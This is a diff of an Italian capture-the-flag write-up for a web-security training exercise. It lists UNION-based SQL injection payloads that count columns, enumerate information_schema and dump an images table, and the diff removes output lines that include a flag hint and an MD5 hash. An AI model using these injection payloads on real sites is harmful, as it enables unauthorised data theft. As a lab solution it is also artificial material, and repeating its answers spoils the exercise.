@@ -6,18 +6,15 @@ troviamo un tag <input> vulnerabile a Sql Injection
 proviamo a prendere le colonne del db
 ```
 1 OR 1=1 UNION SELECT NULL, NULL--
-> 2 columns
 ```
-Vediamo che ci sono delle colonne con immagini 
+Vediamo che ci sono 2 colonne con immagini 
 ```
 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
-> id, url, title, comment
 ```
 
 ora leggiamo i dati di tutte le immagini
 ```
 1 AND 1=2 UNION SELECT id, CONCAT(url, title, comment) FROM list_images
-> borntosec.ddns.net/images.pngHack me ?If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
 ```
 
 Troviamo che l'immagine con id 5 contiene i seguenti campi 
